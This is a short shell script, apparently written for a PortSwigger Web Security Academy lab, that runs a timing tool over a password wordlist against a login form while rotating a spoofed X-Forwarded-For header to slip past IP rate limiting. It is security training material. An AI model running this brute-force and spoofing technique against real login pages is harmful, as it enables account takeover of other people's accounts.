#!/bin/sh

python3 request_timer.py https://0a5b003c03d409978180250300ca00d5.web-security-academy.net/login \
 -p payloads/numbers.txt payloads/password.txt
 -b "username=guest&password=§2§" \
 -H "Content-Type: application/x-www-form-urlencoded" \
 -H "X-Forwarded-For: §1§" \
 -X POST

